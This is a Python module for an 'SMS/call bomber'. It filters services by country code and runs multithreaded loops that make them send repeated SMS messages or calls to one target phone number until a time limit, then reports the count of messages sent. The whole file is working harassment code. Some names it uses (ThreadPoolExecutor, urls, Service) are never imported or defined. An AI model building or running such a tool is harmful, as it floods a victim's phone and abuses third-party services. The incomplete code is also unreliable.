import threading
import time
import random
from itertools import cycle
from requests import exceptions 

def get_services(country_code, number):
    services = []
    for service in urls(number):
        if service['info']['country'] == 'ALL' or service['info']['country'] == country_code:
            services.append(service)
    return services

class SMSCallBomber(threading.Thread):
    def __init__(self, args):
        super().__init__()
        self.args = args
        if self.args.country == '7':
            self.country_code = 'RU'
        elif self.args.country == '375':
            self.country_code = 'BY'
        elif self.args.country == '380':
            self.country_code = 'UA'
        elif self.args.country == '998':
            self.country_code = 'UZ'
        else:
            self.country_code = 'ALL'
        self.services = get_services(self.country_code, self.args.phone)
        self.successful_count = 0
        self.failed_count = 0
        self.running = True

    def run(self):
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            futures = []
            for _ in range(self.args.threads):
                future = executor.submit(self.attack)
                futures.append(future)

            for future in futures:
                future.result()

            self.send_report()

    def attack(self):
        local_successful_count = 0
        local_failed_count = 0
        for service_info in cycle(random.sample(self.services, len(self.services))):
            if time.time() >= self.args.time or not self.running:
                break

            service = Service(service_info, self.args.phone, self.args.timeout)
            try:
                service.send_request()
                local_successful_count += 1
            except exceptions.ReadTimeout:
                local_failed_count += 1
            except exceptions.ConnectTimeout:
                local_failed_count += 1
            except exceptions.ConnectionError:
                local_failed_count += 1
            except Exception as err:
                local_failed_count += 1
            except (KeyboardInterrupt, SystemExit):
                exit()

        self.successful_count += local_successful_count
        self.failed_count += local_failed_count

    def send_report(self):
        # Отправляем отчет после завершения атаки
        return f"Successfully sent messages(Some may not reach!)(Успешно отправленных сообщений(Дойти могут не все!)): {self.successful_count}\nFailed to send(Не удалось отправить): {self.failed_count}"

    def stop(self):
        self.running = False